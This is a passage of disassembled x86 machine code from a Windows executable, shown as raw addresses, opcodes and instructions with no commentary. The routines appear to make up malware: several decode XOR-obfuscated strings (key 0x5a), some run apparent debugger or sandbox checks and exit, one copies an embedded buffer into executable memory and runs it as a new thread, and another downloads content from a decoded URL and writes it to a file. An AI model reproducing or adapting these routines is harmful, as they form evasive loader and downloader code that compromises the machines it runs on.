  403bca:	83 c4 08             	add    $0x8,%esp
  403bcd:	68 54 b0 40 00       	push   $0x40b054
  403bd2:	8d 85 00 ff ff ff    	lea    -0x100(%ebp),%eax
  403bd8:	50                   	push   %eax
  403bd9:	e8 86 3d 00 00       	call   0x407964
  403bde:	83 c4 08             	add    $0x8,%esp
  403be1:	8d 8d 00 ff ff ff    	lea    -0x100(%ebp),%ecx
  403be7:	51                   	push   %ecx
  403be8:	e8 71 3d 00 00       	call   0x40795e
  403bed:	83 c4 04             	add    $0x4,%esp
  403bf0:	8b e5                	mov    %ebp,%esp
  403bf2:	5d                   	pop    %ebp
  403bf3:	c3                   	ret
  403bf4:	cc                   	int3
  403bf5:	cc                   	int3
  403bf6:	cc                   	int3
  403bf7:	cc                   	int3
  403bf8:	cc                   	int3
  403bf9:	cc                   	int3
  403bfa:	cc                   	int3
  403bfb:	cc                   	int3
  403bfc:	cc                   	int3
  403bfd:	cc                   	int3
  403bfe:	cc                   	int3
  403bff:	cc                   	int3
  403c00:	55                   	push   %ebp
  403c01:	8b ec                	mov    %esp,%ebp
  403c03:	81 ec 0c 03 00 00    	sub    $0x30c,%esp
  403c09:	83 3d b0 de 40 00 00 	cmpl   $0x0,0x40deb0
  403c10:	75 52                	jne    0x403c64
  403c12:	c7 85 fc fc ff ff 00 	movl   $0x0,-0x304(%ebp)
  403c19:	00 00 00 
  403c1c:	8b 85 fc fc ff ff    	mov    -0x304(%ebp),%eax
  403c22:	0f b6 88 24 b0 40 00 	movzbl 0x40b024(%eax),%ecx
  403c29:	85 c9                	test   %ecx,%ecx
  403c2b:	74 2d                	je     0x403c5a
  403c2d:	8b 95 fc fc ff ff    	mov    -0x304(%ebp),%edx
  403c33:	0f b6 82 24 b0 40 00 	movzbl 0x40b024(%edx),%eax
  403c3a:	83 f0 5a             	xor    $0x5a,%eax
  403c3d:	8b 8d fc fc ff ff    	mov    -0x304(%ebp),%ecx
  403c43:	88 81 24 b0 40 00    	mov    %al,0x40b024(%ecx)
  403c49:	8b 95 fc fc ff ff    	mov    -0x304(%ebp),%edx
  403c4f:	83 c2 01             	add    $0x1,%edx
  403c52:	89 95 fc fc ff ff    	mov    %edx,-0x304(%ebp)
  403c58:	eb c2                	jmp    0x403c1c
  403c5a:	c7 05 b0 de 40 00 01 	movl   $0x1,0x40deb0
  403c61:	00 00 00 
  403c64:	c6 85 00 fd ff ff 00 	movb   $0x0,-0x300(%ebp)
  403c6b:	68 ff 00 00 00       	push   $0xff
  403c70:	6a 00                	push   $0x0
  403c72:	8d 85 01 fd ff ff    	lea    -0x2ff(%ebp),%eax
  403c78:	50                   	push   %eax
  403c79:	e8 96 3c 00 00       	call   0x407914
  403c7e:	83 c4 0c             	add    $0xc,%esp
  403c81:	68 24 b0 40 00       	push   $0x40b024
  403c86:	68 9c 99 40 00       	push   $0x40999c
  403c8b:	8d 8d 00 fd ff ff    	lea    -0x300(%ebp),%ecx
  403c91:	51                   	push   %ecx
  403c92:	ff 15 74 90 40 00    	call   *0x409074
  403c98:	83 c4 0c             	add    $0xc,%esp
  403c9b:	83 3d 38 dd 40 00 00 	cmpl   $0x0,0x40dd38
  403ca2:	74 0f                	je     0x403cb3
  403ca4:	6a 00                	push   $0x0
  403ca6:	8d 95 00 fd ff ff    	lea    -0x300(%ebp),%edx
  403cac:	52                   	push   %edx
  403cad:	ff 15 38 dd 40 00    	call   *0x40dd38
  403cb3:	83 3d ac de 40 00 00 	cmpl   $0x0,0x40deac
  403cba:	75 52                	jne    0x403d0e
  403cbc:	c7 85 f8 fc ff ff 00 	movl   $0x0,-0x308(%ebp)
  403cc3:	00 00 00 
  403cc6:	8b 85 f8 fc ff ff    	mov    -0x308(%ebp),%eax
  403ccc:	0f b6 88 64 b0 40 00 	movzbl 0x40b064(%eax),%ecx
  403cd3:	85 c9                	test   %ecx,%ecx
  403cd5:	74 2d                	je     0x403d04
  403cd7:	8b 95 f8 fc ff ff    	mov    -0x308(%ebp),%edx
  403cdd:	0f b6 82 64 b0 40 00 	movzbl 0x40b064(%edx),%eax
  403ce4:	83 f0 5a             	xor    $0x5a,%eax
  403ce7:	8b 8d f8 fc ff ff    	mov    -0x308(%ebp),%ecx
  403ced:	88 81 64 b0 40 00    	mov    %al,0x40b064(%ecx)
  403cf3:	8b 95 f8 fc ff ff    	mov    -0x308(%ebp),%edx
  403cf9:	83 c2 01             	add    $0x1,%edx
  403cfc:	89 95 f8 fc ff ff    	mov    %edx,-0x308(%ebp)
  403d02:	eb c2                	jmp    0x403cc6
  403d04:	c7 05 ac de 40 00 01 	movl   $0x1,0x40deac
  403d0b:	00 00 00 
  403d0e:	83 3d a8 de 40 00 00 	cmpl   $0x0,0x40dea8
  403d15:	75 52                	jne    0x403d69
  403d17:	c7 85 f4 fc ff ff 00 	movl   $0x0,-0x30c(%ebp)
  403d1e:	00 00 00 
  403d21:	8b 85 f4 fc ff ff    	mov    -0x30c(%ebp),%eax
  403d27:	0f b6 88 80 b0 40 00 	movzbl 0x40b080(%eax),%ecx
  403d2e:	85 c9                	test   %ecx,%ecx
  403d30:	74 2d                	je     0x403d5f
  403d32:	8b 95 f4 fc ff ff    	mov    -0x30c(%ebp),%edx
  403d38:	0f b6 82 80 b0 40 00 	movzbl 0x40b080(%edx),%eax
  403d3f:	83 f0 5a             	xor    $0x5a,%eax
  403d42:	8b 8d f4 fc ff ff    	mov    -0x30c(%ebp),%ecx
  403d48:	88 81 80 b0 40 00    	mov    %al,0x40b080(%ecx)
  403d4e:	8b 95 f4 fc ff ff    	mov    -0x30c(%ebp),%edx
  403d54:	83 c2 01             	add    $0x1,%edx
  403d57:	89 95 f4 fc ff ff    	mov    %edx,-0x30c(%ebp)
  403d5d:	eb c2                	jmp    0x403d21
  403d5f:	c7 05 a8 de 40 00 01 	movl   $0x1,0x40dea8
  403d66:	00 00 00 
  403d69:	c6 85 00 fe ff ff 00 	movb   $0x0,-0x200(%ebp)
  403d70:	68 ff 01 00 00       	push   $0x1ff
  403d75:	6a 00                	push   $0x0
  403d77:	8d 85 01 fe ff ff    	lea    -0x1ff(%ebp),%eax
  403d7d:	50                   	push   %eax
  403d7e:	e8 91 3b 00 00       	call   0x407914
  403d83:	83 c4 0c             	add    $0xc,%esp
  403d86:	68 64 b0 40 00       	push   $0x40b064
  403d8b:	8d 8d 00 fe ff ff    	lea    -0x200(%ebp),%ecx
  403d91:	51                   	push   %ecx
  403d92:	e8 71 3b 00 00       	call   0x407908
  403d97:	83 c4 08             	add    $0x8,%esp
  403d9a:	68 80 b0 40 00       	push   $0x40b080
  403d9f:	8d 95 00 fe ff ff    	lea    -0x200(%ebp),%edx
  403da5:	52                   	push   %edx
  403da6:	e8 b9 3b 00 00       	call   0x407964
  403dab:	83 c4 08             	add    $0x8,%esp
  403dae:	8d 85 00 fe ff ff    	lea    -0x200(%ebp),%eax
  403db4:	50                   	push   %eax
  403db5:	ff 15 c8 90 40 00    	call   *0x4090c8
  403dbb:	83 c4 04             	add    $0x4,%esp
  403dbe:	33 c0                	xor    %eax,%eax
  403dc0:	8b e5                	mov    %ebp,%esp
  403dc2:	5d                   	pop    %ebp
  403dc3:	c2 04 00             	ret    $0x4
  403dc6:	cc                   	int3
  403dc7:	cc                   	int3
  403dc8:	cc                   	int3
  403dc9:	cc                   	int3
  403dca:	cc                   	int3
  403dcb:	cc                   	int3
  403dcc:	cc                   	int3
  403dcd:	cc                   	int3
  403dce:	cc                   	int3
  403dcf:	cc                   	int3
  403dd0:	55                   	push   %ebp
  403dd1:	8b ec                	mov    %esp,%ebp
  403dd3:	81 ec 88 00 00 00    	sub    $0x88,%esp
  403dd9:	83 3d b4 de 40 00 00 	cmpl   $0x0,0x40deb4
  403de0:	75 52                	jne    0x403e34
  403de2:	c7 85 78 ff ff ff 00 	movl   $0x0,-0x88(%ebp)
  403de9:	00 00 00 
  403dec:	8b 85 78 ff ff ff    	mov    -0x88(%ebp),%eax
  403df2:	0f b6 88 e0 b0 40 00 	movzbl 0x40b0e0(%eax),%ecx
  403df9:	85 c9                	test   %ecx,%ecx
  403dfb:	74 2d                	je     0x403e2a
  403dfd:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  403e03:	0f b6 82 e0 b0 40 00 	movzbl 0x40b0e0(%edx),%eax
  403e0a:	83 f0 5a             	xor    $0x5a,%eax
  403e0d:	8b 8d 78 ff ff ff    	mov    -0x88(%ebp),%ecx
  403e13:	88 81 e0 b0 40 00    	mov    %al,0x40b0e0(%ecx)
  403e19:	8b 95 78 ff ff ff    	mov    -0x88(%ebp),%edx
  403e1f:	83 c2 01             	add    $0x1,%edx
  403e22:	89 95 78 ff ff ff    	mov    %edx,-0x88(%ebp)
  403e28:	eb c2                	jmp    0x403dec
  403e2a:	c7 05 b4 de 40 00 01 	movl   $0x1,0x40deb4
  403e31:	00 00 00 
  403e34:	c7 45 cc e0 b0 40 00 	movl   $0x40b0e0,-0x34(%ebp)
  403e3b:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%ebp)
  403e42:	6a 20                	push   $0x20
  403e44:	6a 00                	push   $0x0
  403e46:	8d 45 d0             	lea    -0x30(%ebp),%eax
  403e49:	50                   	push   %eax
  403e4a:	e8 c5 3a 00 00       	call   0x407914
  403e4f:	83 c4 0c             	add    $0xc,%esp
  403e52:	c7 45 d4 00 00 00 00 	movl   $0x0,-0x2c(%ebp)
  403e59:	c7 45 d8 01 00 00 00 	movl   $0x1,-0x28(%ebp)
  403e60:	c7 45 fc b8 99 40 00 	movl   $0x4099b8,-0x4(%ebp)
  403e67:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  403e6a:	51                   	push   %ecx
  403e6b:	8d 55 d0             	lea    -0x30(%ebp),%edx
  403e6e:	52                   	push   %edx
  403e6f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403e72:	50                   	push   %eax
  403e73:	8b 4d cc             	mov    -0x34(%ebp),%ecx
  403e76:	51                   	push   %ecx
  403e77:	ff 15 30 91 40 00    	call   *0x409130
  403e7d:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403e80:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  403e84:	74 0d                	je     0x403e93
  403e86:	ff 15 60 91 40 00    	call   *0x409160
  403e8c:	b8 01 00 00 00       	mov    $0x1,%eax
  403e91:	eb 71                	jmp    0x403f04
  403e93:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403e96:	89 55 f8             	mov    %edx,-0x8(%ebp)
  403e99:	eb 09                	jmp    0x403ea4
  403e9b:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403e9e:	8b 48 1c             	mov    0x1c(%eax),%ecx
  403ea1:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  403ea4:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403ea8:	74 4e                	je     0x403ef8
  403eaa:	c7 85 7c ff ff ff 00 	movl   $0x0,-0x84(%ebp)
  403eb1:	00 00 00 
  403eb4:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403eb7:	83 7a 04 02          	cmpl   $0x2,0x4(%edx)
  403ebb:	75 11                	jne    0x403ece
  403ebd:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403ec0:	8b 48 18             	mov    0x18(%eax),%ecx
  403ec3:	83 c1 04             	add    $0x4,%ecx
  403ec6:	89 8d 7c ff ff ff    	mov    %ecx,-0x84(%ebp)
  403ecc:	eb 0f                	jmp    0x403edd
  403ece:	8b 55 f8             	mov    -0x8(%ebp),%edx
  403ed1:	8b 42 18             	mov    0x18(%edx),%eax
  403ed4:	83 c0 08             	add    $0x8,%eax
  403ed7:	89 85 7c ff ff ff    	mov    %eax,-0x84(%ebp)
  403edd:	6a 41                	push   $0x41
  403edf:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  403ee2:	51                   	push   %ecx
  403ee3:	8b 95 7c ff ff ff    	mov    -0x84(%ebp),%edx
  403ee9:	52                   	push   %edx
  403eea:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403eed:	8b 48 04             	mov    0x4(%eax),%ecx
  403ef0:	51                   	push   %ecx
  403ef1:	e8 0c 3a 00 00       	call   0x407902
  403ef6:	eb a3                	jmp    0x403e9b
  403ef8:	8b 55 f0             	mov    -0x10(%ebp),%edx
  403efb:	52                   	push   %edx
  403efc:	ff 15 38 91 40 00    	call   *0x409138
  403f02:	33 c0                	xor    %eax,%eax
  403f04:	8b e5                	mov    %ebp,%esp
  403f06:	5d                   	pop    %ebp
  403f07:	c2 04 00             	ret    $0x4
  403f0a:	cc                   	int3
  403f0b:	cc                   	int3
  403f0c:	cc                   	int3
  403f0d:	cc                   	int3
  403f0e:	cc                   	int3
  403f0f:	cc                   	int3
  403f10:	55                   	push   %ebp
  403f11:	8b ec                	mov    %esp,%ebp
  403f13:	83 ec 18             	sub    $0x18,%esp
  403f16:	c6 45 ff 00          	movb   $0x0,-0x1(%ebp)
  403f1a:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  403f21:	8b 45 e8             	mov    -0x18(%ebp),%eax
  403f24:	0f b6 88 90 b0 40 00 	movzbl 0x40b090(%eax),%ecx
  403f2b:	85 c9                	test   %ecx,%ecx
  403f2d:	74 21                	je     0x403f50
  403f2f:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403f32:	0f b6 82 90 b0 40 00 	movzbl 0x40b090(%edx),%eax
  403f39:	83 f0 5a             	xor    $0x5a,%eax
  403f3c:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  403f3f:	88 81 90 b0 40 00    	mov    %al,0x40b090(%ecx)
  403f45:	8b 55 e8             	mov    -0x18(%ebp),%edx
  403f48:	83 c2 01             	add    $0x1,%edx
  403f4b:	89 55 e8             	mov    %edx,-0x18(%ebp)
  403f4e:	eb d1                	jmp    0x403f21
  403f50:	68 bc 99 40 00       	push   $0x4099bc
  403f55:	ff 15 20 dd 40 00    	call   *0x40dd20
  403f5b:	89 45 f4             	mov    %eax,-0xc(%ebp)
  403f5e:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  403f62:	74 57                	je     0x403fbb
  403f64:	68 cc 99 40 00       	push   $0x4099cc
  403f69:	8b 45 f4             	mov    -0xc(%ebp),%eax
  403f6c:	50                   	push   %eax
  403f6d:	ff 15 1c dd 40 00    	call   *0x40dd1c
  403f73:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403f76:	68 dc 99 40 00       	push   $0x4099dc
  403f7b:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  403f7e:	51                   	push   %ecx
  403f7f:	ff 15 1c dd 40 00    	call   *0x40dd1c
  403f85:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403f88:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  403f8c:	74 2d                	je     0x403fbb
  403f8e:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  403f92:	74 27                	je     0x403fbb
  403f94:	8d 55 f8             	lea    -0x8(%ebp),%edx
  403f97:	52                   	push   %edx
  403f98:	68 19 00 02 00       	push   $0x20019
  403f9d:	6a 00                	push   $0x0
  403f9f:	68 90 b0 40 00       	push   $0x40b090
  403fa4:	68 02 00 00 80       	push   $0x80000002
  403fa9:	ff 55 f0             	call   *-0x10(%ebp)
  403fac:	85 c0                	test   %eax,%eax
  403fae:	75 0b                	jne    0x403fbb
  403fb0:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403fb3:	50                   	push   %eax
  403fb4:	ff 55 ec             	call   *-0x14(%ebp)
  403fb7:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  403fbb:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  403fbf:	8b e5                	mov    %ebp,%esp
  403fc1:	5d                   	pop    %ebp
  403fc2:	c3                   	ret
  403fc3:	cc                   	int3
  403fc4:	cc                   	int3
  403fc5:	cc                   	int3
  403fc6:	cc                   	int3
  403fc7:	cc                   	int3
  403fc8:	cc                   	int3
  403fc9:	cc                   	int3
  403fca:	cc                   	int3
  403fcb:	cc                   	int3
  403fcc:	cc                   	int3
  403fcd:	cc                   	int3
  403fce:	cc                   	int3
  403fcf:	cc                   	int3
  403fd0:	55                   	push   %ebp
  403fd1:	8b ec                	mov    %esp,%ebp
  403fd3:	83 ec 18             	sub    $0x18,%esp
  403fd6:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  403fdd:	68 e8 99 40 00       	push   $0x4099e8
  403fe2:	ff 15 18 dd 40 00    	call   *0x40dd18
  403fe8:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403feb:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  403fef:	74 75                	je     0x404066
  403ff1:	68 f8 99 40 00       	push   $0x4099f8
  403ff6:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403ff9:	50                   	push   %eax
  403ffa:	ff 15 1c dd 40 00    	call   *0x40dd1c
  404000:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404003:	68 0c 9a 40 00       	push   $0x409a0c
  404008:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40400b:	51                   	push   %ecx
  40400c:	ff 15 1c dd 40 00    	call   *0x40dd1c
  404012:	89 45 f4             	mov    %eax,-0xc(%ebp)
  404015:	68 28 9a 40 00       	push   $0x409a28
  40401a:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40401d:	52                   	push   %edx
  40401e:	ff 15 1c dd 40 00    	call   *0x40dd1c
  404024:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404027:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40402b:	74 0e                	je     0x40403b
  40402d:	ff 55 ec             	call   *-0x14(%ebp)
  404030:	85 c0                	test   %eax,%eax
  404032:	74 07                	je     0x40403b
  404034:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40403b:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40403f:	74 25                	je     0x404066
  404041:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  404045:	74 1f                	je     0x404066
  404047:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  40404e:	8d 45 e8             	lea    -0x18(%ebp),%eax
  404051:	50                   	push   %eax
  404052:	ff 55 f0             	call   *-0x10(%ebp)
  404055:	50                   	push   %eax
  404056:	ff 55 f4             	call   *-0xc(%ebp)
  404059:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  40405d:	74 07                	je     0x404066
  40405f:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  404066:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404069:	8b e5                	mov    %ebp,%esp
  40406b:	5d                   	pop    %ebp
  40406c:	c3                   	ret
  40406d:	cc                   	int3
  40406e:	cc                   	int3
  40406f:	cc                   	int3
  404070:	55                   	push   %ebp
  404071:	8b ec                	mov    %esp,%ebp
  404073:	e8 98 fe ff ff       	call   0x403f10
  404078:	85 c0                	test   %eax,%eax
  40407a:	74 08                	je     0x404084
  40407c:	6a 00                	push   $0x0
  40407e:	ff 15 0c 90 40 00    	call   *0x40900c
  404084:	e8 47 ff ff ff       	call   0x403fd0
  404089:	85 c0                	test   %eax,%eax
  40408b:	74 08                	je     0x404095
  40408d:	6a 00                	push   $0x0
  40408f:	ff 15 0c 90 40 00    	call   *0x40900c
  404095:	33 c0                	xor    %eax,%eax
  404097:	5d                   	pop    %ebp
  404098:	c2 04 00             	ret    $0x4
  40409b:	cc                   	int3
  40409c:	cc                   	int3
  40409d:	cc                   	int3
  40409e:	cc                   	int3
  40409f:	cc                   	int3
  4040a0:	55                   	push   %ebp
  4040a1:	8b ec                	mov    %esp,%ebp
  4040a3:	83 ec 08             	sub    $0x8,%esp
  4040a6:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4040ad:	33 c0                	xor    %eax,%eax
  4040af:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4040b2:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%ebp)
  4040b9:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  4040c0:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4040c3:	51                   	push   %ecx
  4040c4:	e8 27 ed ff ff       	call   0x402df0
  4040c9:	83 c4 04             	add    $0x4,%esp
  4040cc:	e8 cf ef ff ff       	call   0x4030a0
  4040d1:	33 c0                	xor    %eax,%eax
  4040d3:	8b e5                	mov    %ebp,%esp
  4040d5:	5d                   	pop    %ebp
  4040d6:	c2 04 00             	ret    $0x4
  4040d9:	cc                   	int3
  4040da:	cc                   	int3
  4040db:	cc                   	int3
  4040dc:	cc                   	int3
  4040dd:	cc                   	int3
  4040de:	cc                   	int3
  4040df:	cc                   	int3
  4040e0:	55                   	push   %ebp
  4040e1:	8b ec                	mov    %esp,%ebp
  4040e3:	83 ec 08             	sub    $0x8,%esp
  4040e6:	83 3d 08 b1 40 00 13 	cmpl   $0x13,0x40b108
  4040ed:	7f 02                	jg     0x4040f1
  4040ef:	eb 4f                	jmp    0x404140
  4040f1:	6a 40                	push   $0x40
  4040f3:	68 00 30 00 00       	push   $0x3000
  4040f8:	a1 08 b1 40 00       	mov    0x40b108,%eax
  4040fd:	50                   	push   %eax
  4040fe:	6a 00                	push   $0x0
  404100:	ff 15 3c dd 40 00    	call   *0x40dd3c
  404106:	89 45 f8             	mov    %eax,-0x8(%ebp)
  404109:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40410d:	75 02                	jne    0x404111
  40410f:	eb 2f                	jmp    0x404140
  404111:	8b 0d 08 b1 40 00    	mov    0x40b108,%ecx
  404117:	51                   	push   %ecx
  404118:	68 10 b1 40 00       	push   $0x40b110
  40411d:	8b 55 f8             	mov    -0x8(%ebp),%edx
  404120:	52                   	push   %edx
  404121:	e8 2c 38 00 00       	call   0x407952
  404126:	83 c4 0c             	add    $0xc,%esp
  404129:	6a 00                	push   $0x0
  40412b:	6a 00                	push   $0x0
  40412d:	6a 00                	push   $0x0
  40412f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404132:	50                   	push   %eax
  404133:	6a 00                	push   $0x0
  404135:	6a 00                	push   $0x0
  404137:	ff 15 40 dd 40 00    	call   *0x40dd40
  40413d:	89 45 fc             	mov    %eax,-0x4(%ebp)
  404140:	8b e5                	mov    %ebp,%esp
  404142:	5d                   	pop    %ebp
  404143:	c3                   	ret
  404144:	cc                   	int3
  404145:	cc                   	int3
  404146:	cc                   	int3
  404147:	cc                   	int3
  404148:	cc                   	int3
  404149:	cc                   	int3
  40414a:	cc                   	int3
  40414b:	cc                   	int3
  40414c:	cc                   	int3
  40414d:	cc                   	int3
  40414e:	cc                   	int3
  40414f:	cc                   	int3
  404150:	55                   	push   %ebp
  404151:	8b ec                	mov    %esp,%ebp
  404153:	81 ec 28 04 00 00    	sub    $0x428,%esp
  404159:	c7 85 e0 fb ff ff 00 	movl   $0x0,-0x420(%ebp)
  404160:	00 00 00 
  404163:	8b 85 e0 fb ff ff    	mov    -0x420(%ebp),%eax
  404169:	0f b6 88 ac b0 40 00 	movzbl 0x40b0ac(%eax),%ecx
  404170:	85 c9                	test   %ecx,%ecx
  404172:	74 2d                	je     0x4041a1
  404174:	8b 95 e0 fb ff ff    	mov    -0x420(%ebp),%edx
  40417a:	0f b6 82 ac b0 40 00 	movzbl 0x40b0ac(%edx),%eax
  404181:	83 f0 5a             	xor    $0x5a,%eax
  404184:	8b 8d e0 fb ff ff    	mov    -0x420(%ebp),%ecx
  40418a:	88 81 ac b0 40 00    	mov    %al,0x40b0ac(%ecx)
  404190:	8b 95 e0 fb ff ff    	mov    -0x420(%ebp),%edx
  404196:	83 c2 01             	add    $0x1,%edx
  404199:	89 95 e0 fb ff ff    	mov    %edx,-0x420(%ebp)
  40419f:	eb c2                	jmp    0x404163
  4041a1:	c7 85 dc fb ff ff 00 	movl   $0x0,-0x424(%ebp)
  4041a8:	00 00 00 
  4041ab:	8b 85 dc fb ff ff    	mov    -0x424(%ebp),%eax
  4041b1:	0f b6 88 f0 b0 40 00 	movzbl 0x40b0f0(%eax),%ecx
  4041b8:	85 c9                	test   %ecx,%ecx
  4041ba:	74 2d                	je     0x4041e9
  4041bc:	8b 95 dc fb ff ff    	mov    -0x424(%ebp),%edx
  4041c2:	0f b6 82 f0 b0 40 00 	movzbl 0x40b0f0(%edx),%eax
  4041c9:	83 f0 5a             	xor    $0x5a,%eax
  4041cc:	8b 8d dc fb ff ff    	mov    -0x424(%ebp),%ecx
  4041d2:	88 81 f0 b0 40 00    	mov    %al,0x40b0f0(%ecx)
  4041d8:	8b 95 dc fb ff ff    	mov    -0x424(%ebp),%edx
  4041de:	83 c2 01             	add    $0x1,%edx
  4041e1:	89 95 dc fb ff ff    	mov    %edx,-0x424(%ebp)
  4041e7:	eb c2                	jmp    0x4041ab
  4041e9:	c7 85 d8 fb ff ff 00 	movl   $0x0,-0x428(%ebp)
  4041f0:	00 00 00 
  4041f3:	8b 85 d8 fb ff ff    	mov    -0x428(%ebp),%eax
  4041f9:	0f b6 88 fc b0 40 00 	movzbl 0x40b0fc(%eax),%ecx
  404200:	85 c9                	test   %ecx,%ecx
  404202:	74 2d                	je     0x404231
  404204:	8b 95 d8 fb ff ff    	mov    -0x428(%ebp),%edx
  40420a:	0f b6 82 fc b0 40 00 	movzbl 0x40b0fc(%edx),%eax
  404211:	83 f0 5a             	xor    $0x5a,%eax
  404214:	8b 8d d8 fb ff ff    	mov    -0x428(%ebp),%ecx
  40421a:	88 81 fc b0 40 00    	mov    %al,0x40b0fc(%ecx)
  404220:	8b 95 d8 fb ff ff    	mov    -0x428(%ebp),%edx
  404226:	83 c2 01             	add    $0x1,%edx
  404229:	89 95 d8 fb ff ff    	mov    %edx,-0x428(%ebp)
  40422f:	eb c2                	jmp    0x4041f3
  404231:	c7 45 f8 ac b0 40 00 	movl   $0x40b0ac,-0x8(%ebp)
  404238:	c7 45 fc f0 b0 40 00 	movl   $0x40b0f0,-0x4(%ebp)
  40423f:	6a 00                	push   $0x0
  404241:	6a 00                	push   $0x0
  404243:	6a 00                	push   $0x0
  404245:	6a 01                	push   $0x1
  404247:	68 fc b0 40 00       	push   $0x40b0fc
  40424c:	ff 15 a8 dd 40 00    	call   *0x40dda8
  404252:	89 45 f0             	mov    %eax,-0x10(%ebp)
  404255:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  404259:	0f 84 a7 00 00 00    	je     0x404306
  40425f:	6a 00                	push   $0x0
  404261:	68 00 00 00 80       	push   $0x80000000
  404266:	6a 00                	push   $0x0
  404268:	6a 00                	push   $0x0
  40426a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40426d:	50                   	push   %eax
  40426e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404271:	51                   	push   %ecx
  404272:	ff 15 ac dd 40 00    	call   *0x40ddac
  404278:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40427b:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  40427f:	74 7b                	je     0x4042fc
  404281:	68 3c 9a 40 00       	push   $0x409a3c
  404286:	8b 55 fc             	mov    -0x4(%ebp),%edx
  404289:	52                   	push   %edx
  40428a:	ff 15 88 90 40 00    	call   *0x409088
  404290:	83 c4 08             	add    $0x8,%esp
  404293:	89 45 ec             	mov    %eax,-0x14(%ebp)
  404296:	83 7d ec 00          	cmpl   $0x0,-0x14(%ebp)
  40429a:	74 56                	je     0x4042f2
  40429c:	8d 85 e4 fb ff ff    	lea    -0x41c(%ebp),%eax
  4042a2:	50                   	push   %eax
  4042a3:	68 00 04 00 00       	push   $0x400
  4042a8:	8d 8d e8 fb ff ff    	lea    -0x418(%ebp),%ecx
  4042ae:	51                   	push   %ecx
  4042af:	8b 55 f4             	mov    -0xc(%ebp),%edx
  4042b2:	52                   	push   %edx
  4042b3:	ff 15 b0 dd 40 00    	call   *0x40ddb0
  4042b9:	85 c0                	test   %eax,%eax
  4042bb:	74 28                	je     0x4042e5
  4042bd:	83 bd e4 fb ff ff 00 	cmpl   $0x0,-0x41c(%ebp)
  4042c4:	76 1f                	jbe    0x4042e5
  4042c6:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4042c9:	50                   	push   %eax
  4042ca:	8b 8d e4 fb ff ff    	mov    -0x41c(%ebp),%ecx
  4042d0:	51                   	push   %ecx
  4042d1:	6a 01                	push   $0x1
  4042d3:	8d 95 e8 fb ff ff    	lea    -0x418(%ebp),%edx
  4042d9:	52                   	push   %edx
  4042da:	ff 15 80 90 40 00    	call   *0x409080
  4042e0:	83 c4 10             	add    $0x10,%esp
  4042e3:	eb b7                	jmp    0x40429c
  4042e5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4042e8:	50                   	push   %eax
  4042e9:	ff 15 84 90 40 00    	call   *0x409084
  4042ef:	83 c4 04             	add    $0x4,%esp
  4042f2:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4042f5:	51                   	push   %ecx
  4042f6:	ff 15 b4 dd 40 00    	call   *0x40ddb4
  4042fc:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4042ff:	52                   	push   %edx
  404300:	ff 15 b4 dd 40 00    	call   *0x40ddb4
  404306:	33 c0                	xor    %eax,%eax
  404308:	8b e5                	mov    %ebp,%esp
  40430a:	5d                   	pop    %ebp
  40430b:	c2 04 00             	ret    $0x4
  40430e:	cc                   	int3
  40430f:	cc                   	int3
  404310:	55                   	push   %ebp
  404311:	8b ec                	mov    %esp,%ebp
  404313:	33 c0                	xor    %eax,%eax
  404315:	5d                   	pop    %ebp
  404316:	c2 04 00             	ret    $0x4
  404319:	cc                   	int3
  40431a:	cc                   	int3
